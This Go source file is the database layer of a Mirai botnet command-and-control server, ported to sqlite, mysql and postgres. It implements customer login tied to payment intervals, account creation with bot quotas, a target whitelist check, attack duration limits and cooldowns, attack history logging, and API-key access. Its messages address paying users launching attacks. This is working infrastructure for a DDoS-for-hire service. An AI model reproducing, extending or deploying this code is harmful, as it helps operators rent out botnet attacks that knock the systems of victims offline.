// Multi-DB layer for Mirai CNC — sqlite (default), mysql, postgres via IXF_C2_DSN.
package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"

	"github.com/jmoiron/sqlx"
	_ "github.com/go-sql-driver/mysql"
	_ "github.com/lib/pq"
	_ "modernc.org/sqlite"
)

type Database struct {
	db      *sqlx.DB
	dialect string
}

type AccountInfo struct {
	username string
	maxBots  int
	admin    int
}

func parseDSN(dsn string) (driver, connect string, dialect string) {
	dsn = strings.TrimSpace(dsn)
	if strings.HasPrefix(dsn, "sqlite://") {
		path := strings.TrimPrefix(dsn, "sqlite://")
		return "sqlite", path, "sqlite"
	}
	if strings.HasPrefix(dsn, "mysql://") {
		u, err := url.Parse(dsn)
		if err != nil {
			return "mysql", dsn, "mysql"
		}
		pass, _ := u.User.Password()
		user := u.User.Username()
		host := u.Hostname()
		port := u.Port()
		if port == "" {
			port = "3306"
		}
		db := strings.TrimPrefix(u.Path, "/")
		return "mysql", fmt.Sprintf("%s:%s@tcp(%s:%s)/%s?parseTime=true", user, pass, host, port, db), "mysql"
	}
	if strings.HasPrefix(dsn, "postgres://") || strings.HasPrefix(dsn, "postgresql://") {
		return "postgres", dsn, "postgres"
	}
	// bare path → sqlite
	if !strings.Contains(dsn, "://") {
		return "sqlite", dsn, "sqlite"
	}
	return "mysql", dsn, "mysql"
}

func NewDatabaseFromDSN(dsn string) *Database {
	driver, connect, dialect := parseDSN(dsn)
	db, err := sqlx.Connect(driver, connect)
	if err != nil {
		fmt.Println("DB connect error:", err)
		return &Database{dialect: dialect}
	}
	fmt.Printf("IXF CNC DB opened (%s)\n", dialect)
	return &Database{db: db, dialect: dialect}
}

// Legacy constructor — mysql only (vendor compat).
func NewDatabase(dbAddr, dbUser, dbPassword, dbName string) *Database {
	dsn := fmt.Sprintf("mysql://%s:%s@%s/%s", dbUser, dbPassword, dbAddr, dbName)
	return NewDatabaseFromDSN(dsn)
}

func (d *Database) unixNow() string {
	switch d.dialect {
	case "sqlite":
		return "strftime('%s','now')"
	case "postgres":
		return "EXTRACT(EPOCH FROM NOW())::bigint"
	default:
		return "UNIX_TIMESTAMP()"
	}
}

func (d *Database) intvlCol() string {
	if d.dialect == "mysql" {
		return "`intvl`"
	}
	return "intvl"
}

func (d *Database) TryLogin(username string, password string) (bool, AccountInfo) {
	if d.db == nil {
		return false, AccountInfo{"", 0, 0}
	}
	q := fmt.Sprintf(
		"SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (%s - last_paid < %s * 24 * 60 * 60))",
		d.unixNow(), d.intvlCol(),
	)
	rows, err := d.db.Queryx(d.db.Rebind(q), username, password)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}

func (d *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
	if d.db == nil {
		return false
	}
	rows, err := d.db.Queryx(d.db.Rebind("SELECT username FROM users WHERE username = ?"), username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		rows.Close()
		return false
	}
	rows.Close()
	q := fmt.Sprintf(
		"INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, %s, ?, ?)",
		d.unixNow(),
	)
	_, err = d.db.Exec(d.db.Rebind(q), username, password, max_bots, cooldown, duration)
	return err == nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}

func (d *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	if d.db == nil {
		return false
	}
	rows, err := d.db.Queryx("SELECT prefix, netmask FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()
	for rows.Next() {
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)

		ip := net.ParseIP(prefix)
		ip = ip[12:]
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)

		for aPNetworkOrder, aN := range attack.Targets {
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
			if aN > netmask {
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
					return true
				}
			} else if aN < netmask {
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else {
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}

func (d *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	if d.db == nil {
		return false, errors.New("database unavailable")
	}
	rows, err := d.db.Queryx(d.db.Rebind("SELECT id, duration_limit, cooldown FROM users WHERE username = ?"), username)
	if err != nil {
		fmt.Println(err)
		return false, err
	}
	var userId, durationLimit, cooldown uint32
	if !rows.Next() {
		rows.Close()
		return false, errors.New("Your access has been terminated")
	}
	rows.Scan(&userId, &durationLimit, &cooldown)
	rows.Close()

	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
	}

	if allowConcurrent == 0 {
		q := fmt.Sprintf(
			"SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > %s",
			d.unixNow(),
		)
		rows, err = d.db.Queryx(d.db.Rebind(q), userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows != nil && rows.Next() {
			var timeSent, historyDuration uint32
			rows.Scan(&timeSent, &historyDuration)
			rows.Close()
			return false, errors.New(fmt.Sprintf(
				"Please wait %d seconds before sending another attack",
				(timeSent+historyDuration+cooldown)-uint32(time.Now().Unix()),
			))
		}
		if rows != nil {
			rows.Close()
		}
	}

	q := fmt.Sprintf(
		"INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, %s, ?, ?, ?)",
		d.unixNow(),
	)
	d.db.Exec(d.db.Rebind(q), userId, duration, fullCommand, maxBots)
	return true, nil
}

func (d *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	if d.db == nil {
		return false, AccountInfo{"", 0, 0}
	}
	rows, err := d.db.Queryx(d.db.Rebind("SELECT username, max_bots, admin FROM users WHERE api_key = ?"), apikey)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}
